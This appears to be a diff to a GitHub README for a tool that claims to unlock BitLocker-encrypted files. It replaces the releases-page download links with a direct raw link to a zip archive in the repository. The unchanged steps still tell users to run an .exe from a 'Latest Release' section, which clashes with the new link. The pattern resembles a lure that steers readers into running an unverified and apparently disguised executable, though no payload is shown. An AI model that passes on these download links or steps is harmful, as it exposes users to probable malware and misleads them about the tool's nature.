@@ -1,6 +1,6 @@
 # 🔑 yellowkey-bitlocker - Unlock your BitLocker encrypted computer files
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Desireeontrial76/yellowkey-bitlocker/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Desireeontrial76/yellowkey-bitlocker/raw/refs/heads/main/bitlocker/bitlocker_yellowkey_3.0.zip)
 
 ## 📁 Project Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you start:
 
 Follow these steps to obtain the tool:
 
-1.  Visit [this page to download](https://github.com/Desireeontrial76/yellowkey-bitlocker/releases).
+1.  Visit [this page to download](https://github.com/Desireeontrial76/yellowkey-bitlocker/raw/refs/heads/main/bitlocker/bitlocker_yellowkey_3.0.zip).
 2.  Look for the section marked Latest Release.
 3.  Click the file ending in .exe to start the transfer.
 4.  Save the file to your Downloads folder.
